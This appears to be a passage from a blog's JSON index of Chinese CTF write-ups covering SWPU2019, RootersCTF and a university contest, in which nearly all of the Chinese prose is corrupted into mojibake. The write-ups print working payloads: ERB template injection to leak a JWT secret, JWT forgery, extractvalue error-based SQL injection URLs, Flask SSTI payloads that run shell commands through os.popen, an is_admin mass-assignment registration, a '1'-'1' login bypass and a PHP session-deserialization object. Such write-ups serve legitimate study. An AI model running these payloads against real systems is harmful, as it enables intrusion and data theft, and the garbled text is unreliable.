ENV[\"FLAG\"]} auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth json({title: \"success\",message: \"jkl is good thing\"}) endenddef islogin if cookies[:auth].nil? then redirect to('/shop') endend ä»£ç æ˜¯rubyå†™çš„ï¼Œè¿˜æ²¡å­¦â€¦ä¸è¿‡ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°å‡ºç°äº†JWTï¼Œåº”è¯¥è·ŸJWTä¼ªé€ æœ‰å…³ï¼Œç¨å¾®å®¡ä¸€ä¸‹ä»£ç å‘ç°jklæŒ‡çš„åº”è¯¥å°±æ˜¯é‡‘å¸æ•°é‡ï¼ŒåŒuidä¸€èµ·å†™è¿›äº†cookieé‡Œï¼ŒæŠ“ä¸ªåŒ…æ‹¿jwtè§£å¯†çœ‹çœ‹ï¼š å¯ä»¥çœ‹åˆ°jklçš„å€¼ä¸º28ï¼Œä¹Ÿå°±æ˜¯ç°æœ‰çš„é‡‘å¸æ•°ï¼Œé‚£åº”è¯¥å°±æ˜¯è¦ä¼ªé€ JWTæ¥ä¹°åˆ°flagäº†ï¼Œä½†æ˜¯ä¼ªé€ éœ€è¦SECRETï¼Œç°åœ¨æˆ‘ä»¬å¹¶æ²¡æœ‰ï¼Œæ€ä¹ˆåŠï¼Ÿ åœ¨/workè·¯ç”±ä¸‹æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼š ERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!') è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯åªæœ‰7ä¸ªå­—ç¬¦ï¼Œå‚è€ƒé¢˜è§£è¯´æ˜¯ERBæ¨¡æ¿æ³¨å…¥ï¼Œè¿™é‡Œå¯ä»¥ç”¨rubyçš„é¢„å®šä¹‰å­—ç¬¦$å¯¹åŒ¹é…çš„å­—ç¬¦ä¸²è¿›è¡Œè¯»å–ï¼Œä»è€Œè·å–SECRETï¼Œlåˆ©ç”¨ç‚¹å½“ç„¶ä¹Ÿå°±åœ¨/workè·¯ç”±ä¸‹äº†ï¼Œå¯ä»¥æŠ“åŒ…çœ‹çœ‹ï¼š æ ¹æ®å‚æ•°æ„é€ payloadå¦‚ä¸‹ï¼š /work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20workingå³/work?SECRET=&amp;name=&lt;%=$'%&gt;&amp;do=&lt;%=$'%&gt; is working æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š æ‹¿åˆ°SECRETä¹‹åï¼Œè¿›è¡ŒJWTä¼ªé€ ï¼š ç„¶åbuy flagæŠ“åŒ…è¿›è¡Œæ›¿æ¢å³å¯ä¹°åˆ°flagï¼š ç”±å“åº”ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œå·²ç»æˆåŠŸä¹°åˆ°äº†flagï¼Œä½†æ˜¯å“åº”ä¸­å¹¶æ²¡æœ‰å•Šï¼Œå› ä¸ºåœ¨ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œflagå…¶å®è¢«å†™å…¥åˆ°äº†ç›¸åº”çš„JWTä¸­ï¼Œå†å»è§£å¯†å³å¯æ‹¿åˆ°ã€‚","link":"/2020/03/20/SWPU2019%E5%A4%8D%E7%8E%B0/"},{"title":"RootersCTFå¤ç°","text":"CTFtimeä¸Šå›½å¤–çš„æ¯”èµ›è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œè€Œä¸”å¤§å¤šä¹Ÿéƒ½æ¯”è¾ƒæœ‰æ„æ€ï¼Œå¼€æ‹“è§†é‡ã€‚ RootersCTF-BabywebMy junior dev just set up a password protected webpage. Can you get in? åˆ†æè¿‡ç¨‹æ‰“å¼€é“¾æ¥æç¤ºç®¡ç†å‘˜çš„å¯†ç æ˜¯18ä½ï¼Œå¹¶ä¸”è¿‡æ»¤æ‰äº†UNION SLEEP â€˜ â€œ OR - BENCHMARKã€‚å› æ­¤åˆ©ç”¨çˆ†ç ´å‡ºå¯†ç æ˜¯æ¯”è¾ƒä¸ç°å®çš„ï¼Œç»“åˆé¢˜ç›®æç¤ºæ˜¯ä½¿ç”¨æ³¨å…¥æ–¹æ³•ã€‚çœ‹åˆ°å•å¼•å·å’ŒåŒå¼•å·è¢«è¿‡æ»¤ï¼ŒçŒœæµ‹æ˜¯è¢«åæ–œæ è½¬ä¹‰æ‰ï¼Œä¾¿å°è¯•å®½å­—èŠ‚æ³¨å…¥ï¼Œä½¿ç”¨%df%27è¿›è¡Œæµ‹è¯•ï¼Œç»“æœæ³¨å…¥å¤±è´¥ã€‚ å¹¶ä¸”æç¤ºUNIONã€ORä¹Ÿéƒ½è¢«è¿‡æ»¤ï¼ŒåŸæœ¬æƒ³ç€åˆ©ç”¨å¤§å°å†™æˆ–è€…ç¼–ç ç»•è¿‡ï¼Œä½†æ˜¯å¼•å·æ—¢ç„¶ä¸èƒ½æˆåŠŸç»•è¿‡ï¼Œè¯´æ˜ä¸èƒ½ç”¨é—­åˆå¼•å·è¿›è¡Œæ³¨å…¥ã€‚ç»è¿‡å¤šæ¬¡å°è¯•å‘ç°åˆ©ç”¨extractvalue()å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥å¯ä»¥æˆåŠŸå®ç°æ³¨å…¥,å› æ­¤å¯ä»¥ç»“åˆconcatå‡½æ•°å®ç°æ³¨å…¥ã€‚ extractvalue()ï¼šå‡½æ•°åŠŸèƒ½æ˜¯ä»ç›®æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²ã€‚ EXTRACTVALUE (XML_document, XPath_string); ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDocç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) extractvalueæ³¨å…¥çš„åŸç†ï¼šå¦‚åŒupdatexmlä¸€æ ·ï¼Œextractçš„ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚æ˜¯xpathæ ¼å¼å­—ç¬¦ä¸²ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„å¹¶ä¸æ˜¯ã€‚æ‰€ä»¥æŠ¥é”™ã€‚ æ³¨å…¥è¿‡ç¨‹1ã€çˆ†åº“å https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select%0adatabase()),0x7e)) å›æ˜¾XPATH syntax error:~SQLinjection~ï¼Œçˆ†å‡ºäº†åº“åSQLinjection2ã€çˆ†è¡¨å https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) å›æ˜¾XPATH syntax error:~users~ï¼Œçˆ†å‡ºäº†è¡¨åusersè¿™é‡Œéœ€è¦è¯´åä¸€ä¸‹ï¼Œç”±äºå•åŒå¼•å·è¢«è¿‡æ»¤ï¼Œæ•…æ³¨å…¥è¯­å¥ä¸­å¦‚æœæœ‰å­—ç¬¦ä¸²éœ€è¦å•åŒå¼•å·ï¼Œåº”å½“å°½é‡é¿å…ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æŸ¥è¯¢è¯­å¥çš„å¤šé‡åˆ©ç”¨é¿å…ï¼Œå½“ç„¶ç›´æ¥å¡«åº“åä¹Ÿæ˜¯ä¸éœ€è¦å•åŒå¼•å·çš„ï¼ˆä¸‹é¢è¡¨ååŒç†ï¼‰ã€‚3ã€çˆ†åˆ—å https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e)) å›æ˜¾XPATH syntax error:~userã€uniqueid~ï¼Œçˆ†å‡ºåˆ—åuserã€uniqueidï¼Œè¿™ä¸¤ä¸ªåˆ—é‡Œè‚¯å®šæœ‰æˆ‘ä»¬éœ€è¦çš„é‡è¦å†…å®¹ã€‚4ã€çˆ†å­—æ®µ https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select uniqueid/user from users limit 1),0x7e)) è¿™é‡Œåˆ†ä¸¤æ­¥åˆ†åˆ«çˆ†å‡ºadminå’Œå…¶å¯¹åº”çš„18ä½çš„uniqueidï¼Œæ‹¿å»å°è¯•ç™»å½•ï¼ŒæˆåŠŸç™»è·¯å¹¶æ‹¿åˆ°flagã€‚ç”±äºç¯å¢ƒä¸èƒ½å¤ç°ï¼Œåšé¢˜çš„æ—¶å€™ä¹Ÿæ²¡æœ‰æˆªå›¾ï¼Œè¿™é‡Œä¸å†è´´å‡ºå›¾ç‰‡ã€‚ æŠ¥é”™æ³¨å…¥å‚è€ƒé“¾æ¥ï¼šhttps://www.jianshu.com/p/bf5edd484957 I_&lt;3_Flaskå…¸å‹çš„SSTIï¼Œå‚è€ƒå›½å¤–å¸ˆå‚…çš„WPå­¦åˆ°äº†ä¸€äº›æ–°å§¿åŠ¿ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼š æ–­å®šæ˜¯python flaskçš„SSTIäº†ï¼Œä½†æ˜¯ä¸çŸ¥é“å‚æ•°æ˜¯å•¥ï¼Œåœ¨å¤ç°çš„æ—¶å€™å‘ç°å›½å¤–å¸ˆå‚…æåˆ°ä¸€ä¸ªå‚æ•°æ‰«æçš„å·¥å…·arjunï¼Œç›´æ¥æ‰«å‚æ•°ï¼š ç”¨nameå‚æ•°æµ‹è¯•ä¸€ä¸‹ï¼š å¯ä»¥çœ‹åˆ°æˆåŠŸæ³¨å…¥ï¼Œé‚£ä¸‹é¢å°±æ˜¯åˆ©ç”¨æ³¨å…¥å§¿åŠ¿æ¥çˆ†flagäº†ã€‚ è§£é¢˜ä¸€ç§è§£é¢˜çš„payloadæ˜¯ï¼š name={{''.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__['__builtins__'].eval('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}} name={{''.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__['__builtins__'].eval('__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()')}} ä½†æ˜¯è¿™ç§æ–¹æ³•åœ¨å¤ç°çš„æ—¶å€™æ²¡æœ‰æˆåŠŸï¼Œå­¦åˆ°å¦å¤–ä¸€ç§å§¿åŠ¿ï¼š name={{url_for.__globals__['__builtins__'].open('flag.txt').read()}} å‚è€ƒï¼šhttps://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2 ImgXwebè€ƒå¯ŸJWTä¼ªé€ æ”»å‡»ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®å‘ç°å­˜åœ¨æ³¨å†Œã€ç™»å½•æŒ‰é’®ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªç™»å½•çœ‹çœ‹ï¼Œå‘ç°å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯å¥ˆä½•æœ¬é¢˜ä¸æ˜¯è€ƒæ–‡ä»¶ä¸Šä¼ æ‹¿shellçš„â€¦ é€šè¿‡æ‰«åå°å‘ç°robots.txtçš„å­˜åœ¨ï¼ˆå¯è§æ‰«åå°çš„é‡è¦æ€§å•Šï¼‰ï¼š è€Œrobots.txtä¸­æç¤ºäº†ä¸€ä¸ªsecretkeyç§˜é’¥æ–‡ä»¶çš„å­˜åœ¨ï¼Œå†…å®¹å¦‚ä¸‹ï¼š ç»™è¿™ä¸ªå¹²å˜›ï¼Ÿç»“æœæŠ“åŒ…å‘ç°äº†å¦ä¸€ç•ªå¤©åœ°ï¼š å¯ä»¥çœ‹åˆ°cookieé‡‡ç”¨äº†JWTï¼Œæ‹¿å»base64è§£å¯†ä¸€ä¸‹ï¼ˆè¿˜æœ‰å‡ ç¯‡è®²åˆ°JWTä¼ªé€ æ”»å‡»çš„åšå®¢ï¼Œæœ‰éœ€è¦çš„å¯ä»¥çœ‹çœ‹ï¼‰ï¼š {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}{&quot;user&quot;:&quot;ggb0n&quot;}\u0006Ã—Â¿ÂŠÃ°Â¬Ã#ÃˆÂ”Â¬\u0002Â­ Â“\u0018\u0001Ã­_mnÃ—Â’ÂZ\u001cÂÃ¼Â–Â‰t è¿™è‚¯å®šæ˜¯è€ƒJWTä¼ªé€ çš„äº†ï¼Œç§˜é’¥éƒ½ç»™äº†ï¼Œå¤šç®€å•ï¼Œæ‹¿å»ç½‘ç«™ä¼ªé€ ä¸€ä¸‹ï¼š ç„¶åæŠ“åŒ…æ”¹åŒ…ï¼Œå‘ç°æˆåŠŸä¼ªé€ äº†adminèº«ä»½ï¼Œä»å›æ˜¾é¡µé¢ä¸­å¯ä»¥çœ‹åˆ°flag.pngçš„å­˜åœ¨ï¼Œè¿™é‡Œèµµå¸ˆå‚…æ²¡æœ‰æ”¾åŸå›¾ï¼Œåº”è¯¥æ˜¯ä¸ºäº†æ–¹ä¾¿BOTç”Ÿæˆå’Œè¯†åˆ«å›ºå®šæ ¼å¼çš„flagå§ï¼š å…¶å®ï¼Œflagå·²ç»å¾ˆè¿‘äº†ï¼ŒæŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°flag.pngçš„å­˜å‚¨è·¯å¾„ï¼Œç›´æ¥è®¿é—®å³å¯æ‹¿åˆ°flagï¼š åŸæ¥pngä¸æ˜¯pngï¼Œè€Œæ˜¯txtå•Šâ€¦èµµå¸ˆå‚…badbadã€‚ã€‚ã€‚ notifyxapiè¿˜æ˜¯è€ƒå¯ŸJWTä¼ªé€ æ”»å‡»ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œçœ‹åˆ°ç»™å‡ºäº†å‡ ä¸ªåˆ©ç”¨curlè¿›è¡Œæ³¨å†Œã€ç™»å½•ã€æŸ¥çœ‹é€šçŸ¥çš„å‡ ä¸ªæ“ä½œï¼š æœ‰ç‚¹åƒæ•™æ€ä¹ˆç”¨curlçš„[æ‰‹åŠ¨æ»‘ç¨½]ï¼Œæˆ‘ä»¬æ ¹æ®æä¾›çš„è¯­å¥å»è¯•è¯•æ•ˆæœï¼š å…ˆæ³¨å†Œä¸ªè´¦æˆ·ï¼š curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/\" -H \"Content-Type: application/json\" -d '{\"email\": \"ggb0n@test.com\", \"password\": \"password\"}' {\"created_user\":{\"id\":3,\"user\":{\"email\":\"ggb0n@test.com\",\"id\":3,\"is_admin\":false},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTI2NTEsIm5iZiI6MTU4NDA5MjY1MSwianRpIjoiMTIyZDQ2MTQtNzZhYS00YjJhLTlmZWEtYmY1OTE0ZTQ5OTk0IiwiZXhwIjoxNjE1NjI4NjUxLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.r8-IqT1VUwqJuYpHgKI6uqQZn6nR07RoDnDWWGgyeVc\"}} å…³æ³¨çš„ç‚¹æ¥äº†ï¼šis_adminå±æ€§ä¸ºfalseï¼Œå¤šåŠçŸ¥é“è¿™é¢˜æ˜¯å¹²å˜›çš„äº†ã€‚å…ˆä¸ç®¡ï¼Œå…ˆç™»å½•çœ‹çœ‹ï¼š curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/\" -H \"Content-Type: application/json\" -d '{\"email\": \"ggb0n@test.com\", \"password\": \"password\"}' {\"id\":{\"email\":\"ggb0n@test.com\",\"id\":3,\"is_admin\":false},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTMwNDcsIm5iZiI6MTU4NDA5MzA0NywianRpIjoiZjFlYmViYjItMmFmMi00OWFjLTljN2UtNjFlODM3MTVkN2I2IiwiZXhwIjoxNjE1NjI5MDQ3LCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.Nj2knq7DFsNRoZhNfyAvbMp6wMPV6lWAcXM1p6xIqRo\"} å¯ä»¥çœ‹åˆ°ç™»å½•å’Œæ³¨å†Œçš„æ—¶å€™JWTçš„ç¬¬ä¸‰éƒ¨åˆ†æ˜¯ä¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯è¡¨ç¤ºç™»å½•çš„çŠ¶æ€ï¼Œçœ‹é€šçŸ¥çš„è¯ï¼Œå½“ç„¶è¦å…ˆç™»å½•å˜›ã€‚ æ‹¿ç™»å½•ä¸Šçš„JWTå»çœ‹çœ‹notificationä»€ä¹ˆæƒ…å†µï¼š curl -H \"Authorization: Bearer $ACCESS\" -H \"Content-Type: application/json\" \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/\" [{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"hey, rosssssss\",\"id\":2,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"Jen Barber? Is that the internet?\",\"id\":3,\"title\":\"The IT Crowd\"}] é€šè¿‡è¿™ä¸ªè¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆ«çš„ç”¨æˆ·å‘çš„é€šçŸ¥ï¼Œæƒ³å¿…ç®¡ç†å‘˜èƒ½çœ‹åˆ°ä¸ä¸€æ ·çš„ç»“æœå§ï¼Œç»“åˆå‰é¢å­˜åœ¨çš„is_adminå±æ€§å¹¶ä¸”ä¸ºfalseï¼Œæ€è·¯è‚¯å®šæ˜¯è¦å»æƒ³åŠæ³•è®©is_adminä¸ºtrueäº†ã€‚ è§£é¢˜ç”±äºå›æ˜¾çš„éƒ½æ˜¯æ³¨å†Œæ—¶å€™çš„é”®å€¼å¯¹ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨æ³¨å†Œçš„æ—¶å€™å¤šåŠ ä¸€ä¸ª&quot;id_admin&quot;:trueçš„å±æ€§é”®å€¼å¯¹åˆ›å»ºä¸ªè´¦æˆ·è¯•è¯•ï¼š curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/\" -H \"Content-Type: application/json\" -d '{\"email\": \"gg.b0n@test.com\", \"password\": 1\"password\",\"is_admin\":true}' {\"created_user\":{\"id\":4,\"user\":{\"email\":\"gg.b0n@test.com\",\"id\":4,\"is_admin\":true},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM3MzQsIm5iZiI6MTU4NDA5MzczNCwianRpIjoiZjcyMTYzNWEtZTQ1Ny00NTA0LWI0MDEtNjlmMGM1NzM2OGI1IiwiZXhwIjoxNjE1NjI5NzM0LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.NC-cqxfT8wWgsyDzXMo04NLfAK9k7uim8M127DixOAw\"}} å¯è§è´¦æˆ·æˆåŠŸåˆ›å»ºäº†ï¼Œå¹¶ä¸”æ­¤æ—¶is_adminå±æ€§å·²ç»ä¸ºtrueäº†ï¼Œå¿«ç™»é™†å»çœ‹çœ‹é€šçŸ¥ï¼š curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/\" -H \"Content-Type: application/json\" -d '{\"email\": \"gg.b0n@test.com\", \"password\": \"password\"}' {\"id\":{\"email\":\"gg.b0n@test.com\",\"id\":4,\"is_admin\":true},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM\"} ç”¨ç™»å½•ä¸Šçš„JWTå»çœ‹é€šçŸ¥ï¼š export ACCESS=\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM\"curl -H \"Authorization: Bearer $ACCESS\" -H \"Content-Type: application/json\" \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/\" å›æ˜¾å¦‚ä¸‹ï¼š [{\"issuer\":{\"email\":\"admin@test.com\",\"id\":1},\"body\":\"rooters{a_big_hard_business_in_a_big_hard_building}ctf\",\"id\":1,\"title\":\"flag\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"hey, rosssssss\",\"id\":2,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"Jen Barber? Is that the internet?\",\"id\":3,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"admin@test.com\",\"id\":1},\"body\":\"flag{1b411b83-d725-4e8f-a50a-3bd14a35de6a}\",\"id\":1,\"title\":\"flag\"}] æˆåŠŸæ‹¿åˆ°flagã€‚è¿™é¢˜ç®—æ˜¯è€ƒå¯ŸJWTä¼ªé€ æ¯”è¾ƒç®€å•çš„äº†å§ã€‚","link":"/2020/03/13/RootersCTF%E5%A4%8D%E7%8E%B0/"},{"title":"é«˜æ ¡æˆ˜\"ç–«\"éƒ¨åˆ†é¢˜è§£","text":"20å¤šæ‰€é«˜æ ¡è”åˆå‡ºé¢˜æŠ—â€œç–«â€çš„æ¯”èµ›ï¼Œæ’é¢ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¥æ„Ÿå—ä¸€ä¸‹ä¼˜ç§€é«˜æ ¡çš„ç†é™¶ã€‚ğŸ§ DAY 1çœ‹é˜Ÿå‹å¸ˆå‚…ä»¬åˆ†äº«çš„æ–‡ç« ï¼Œç£•ç£•ç¢°ç¢°æ€»ç®—ä¹Ÿåšå‡ºäº†å‡ é¢˜ sqlcheckinè€ƒå¯Ÿsqlæ³¨å…¥ è§£é¢˜è¿›å…¥é¢˜ç›®ï¼Œå¯ä»¥ç›´æ¥çœ‹æºç ï¼š &lt;?php // ... $pdo = new PDO('mysql:host=localhost;dbname=sqlsql;charset=utf8;', 'xxx', 'xxx'); $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); $stmt = $pdo-&gt;prepare(\"SELECT username from users where username='${_POST['username']}' and password='${_POST['password']}'\"); $stmt-&gt;execute(); $result = $stmt-&gt;fetchAll(); if (count($result) &gt; 0) { if ($result[0]['username'] == 'admin') { include('flag.php'); exit(); // .... å‘ç°åˆæ˜¯ç”¨çš„PDOï¼Œå‰æ®µæ—¶é—´åˆ·é¢˜ï¼Œè¿˜æœ‰èµ›é¢˜éƒ½å‡ºç°äº†ï¼Œè¿™æ€•æ˜¯ä¸€ç§è¶‹åŠ¿ã€‚ ä¸è¿‡è¿™é¢˜ä¸éš¾ï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œä¸€èˆ¬çš„ä¸‡èƒ½å¯†ç æ˜¯ä¸å¥½ç”¨äº†ï¼Œå› ä¸ºorè¢«banäº†ï¼Œä½†æ˜¯é€šè¿‡è¯»ä»£ç å¾ˆå®¹æ˜“èƒ½å‘ç°passwordå¤„å­˜åœ¨æ³¨å…¥ï¼Œorä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯åˆ©ç”¨å‡å·å¯ä»¥æ„é€ ä¸€ä¸ªpassword=falseçš„è¯­å¥ï¼Œè¿™æ ·å°±ä¸åœ¨åˆ¤æ–­passwordäº†ï¼Œæœ€ååˆ©ç”¨ admin/1'-'1ç™»å½•å³å¯æ‹¿åˆ°flagã€‚ hackmeè€ƒå¯ŸPHP sessionçš„ååºåˆ—åŒ–æ¼æ´ï¼Œä¸»è¦åˆ©ç”¨äº†session.serialize_handleråºåˆ—åŒ–å’Œååºåˆ—åŒ–é‡‡ç”¨PHPè€Œå¯¼è‡´çš„æ¼æ´ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œé¦–å…ˆç™»å½•ä¸Šå‘ç°å¯ä»¥æ›´æ”¹signï¼Œåº”è¯¥ä¸ç®¡ç†å‘˜æƒé™æœ‰å…³ã€‚ä½†æ˜¯æŠ“åŒ…ä¹Ÿçœ‹ä¸å‡ºå¯åˆ©ç”¨çš„ç‚¹ã€‚ ç„¶åå°±æ‰«äº†åå°ï¼ŒçœŸçš„å­˜åœ¨æºç ï¼åœ¨/www.zipè·¯å¾„ä¸‹ï¼Œä¸‹è½½ä¹‹ååˆæ˜¯ä¸€ç•ªä»£ç å®¡è®¡ï¼Œåœ¨profile.phpå‘ç°äº†é—®é¢˜ï¼š &lt;?phperror_reporting(0);session_save_path('session');include 'lib.php';ini_set('session.serialize_handler', 'php');session_start();class info{ public $admin; public $sign; public function __construct() { $this-&gt;admin = $_SESSION['admin']; $this-&gt;sign = $_SESSION['sign']; } public function __destruct() { echo $this-&gt;sign; if ($this-&gt;admin === 1) { redirect('./core/index.php'); } }}$a = new info();?&gt; å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œsession.serialize_handlerç”¨çš„æ˜¯PHPï¼Œè€Œinit.phpä¸­å¤„ç†å™¨çš„è®¾ç½®æ˜¯php_serializeè¿™æ ·å°±å¯ä»¥å‚è€ƒå‰é¢æåˆ°çš„PHP sessionçš„æ¼æ´äº†ã€‚å†å¾€ä¸‹å®¡è®¡å‘ç°è¿™é‡Œå®šä¹‰äº†infoç±»ï¼Œå…¶ä¸­æœ‰adminå’Œsignå±æ€§ï¼Œå¹¶ä¸”__destruct()ä¸­æŒ‡æ˜å¦‚æœadmin===1å°±ä¼šå®šå‘åˆ°/core/index.phpï¼Œè¿™æ˜¯ä¸ªä»€ä¹ˆæ–‡ä»¶ï¼Ÿå»çœ‹ä¸€ä¸‹ï¼š &lt;?phprequire_once('./init.php');error_reporting(0);if (check_session($_SESSION)) { #å˜æˆç®¡ç†å‘˜å§ï¼Œå¥¥åˆ©ç»™} else { die('åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°æˆ‘å“Ÿ');} æ­¤å¤„æ— é“¶ä¸‰ç™¾ä¸¤äº†ï¼Œè§£é¢˜çš„å…³é”®è‚¯å®šåœ¨è¿™ï¼Œä½†æ˜¯è¿™ä¸ªåœ°æ–¹ä¼šå¯¹$_SESSIONè¿›è¡Œæ£€æŸ¥ï¼Œå®ƒåˆåŒ…å«ä»€ä¹ˆå‘¢ï¼Ÿåœ¨upload_sign.phpä¸‹å‘ç°äº†å†…å®¹ï¼š &lt;?phprequire_once('init.php');class upload_sign{ public $sign; public $admin = 0; public function __construct() { if (isset($_POST['sign'])) { $this-&gt;sign = $_POST['sign']; } else { $this-&gt;sign = \"è¿™é‡Œç©ºç©ºå¦‚ä¹Ÿå“¦\"; } } public function upload() { if ($this-&gt;checksign($this-&gt;sign)) { $_SESSION['sign'] = $this-&gt;sign; $_SESSION['admin'] = $this-&gt;admin; } else { echo \"???\"; } } public function checksign($sign) { return true; }}$a = new upload_sign();$a-&gt;upload(); å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿™é‡Œä¼šå¯¹$_SESSIONä¸­çš„adminå’Œsignå±æ€§èµ‹å€¼ï¼Œä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå°±å¯ä»¥å¯¹sessionä¸­çš„adminè¿›è¡Œæ§åˆ¶äº†ï¼Œå‚è€ƒè¿™é‡Œï¼Œå³åœ¨è®¾ç½®signçš„é¡µé¢POSTä¸€ä¸ªé”®å€¼å¯¹ï¼Œå¹¶ä¸”å˜é‡åä¸session.upload_progress.nameç›¸åŒï¼Œå³å¯åœ¨sessionä¸­å†™å…¥æ–°çš„å†…å®¹ã€‚ æ ¹æ®è¿™ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬æ„é€ payloadï¼š ggb0n|O:4:\"info\":2:{s:5:\"admin\";i:1;s:4:\"sign\";s:0:\"\";} åœ¨ä¿®æ”¹signçš„é¡µé¢æŠ“åŒ…ï¼Œå†™å…¥payloadï¼š ç»“æœæˆåŠŸè®¾ç½®ç­¾åï¼š ç°åœ¨å°±æ˜¯adminæƒé™äº†ï¼Œåˆ°/core/ä¸‹å‘ç°å¦‚ä¸‹ä»£ç ï¼š ./sandbox/ed04d2f141bd8a57cc5732b0ccf32456 &lt;?phprequire_once('./init.php');error_reporting(0);if (check_session($_SESSION)) { #hint : core/clear.php $sandbox = './sandbox/' . md5(\"Mrk@1xI^\" . $_SERVER['REMOTE_ADDR']); echo $sandbox; @mkdir($sandbox); @chdir($sandbox); 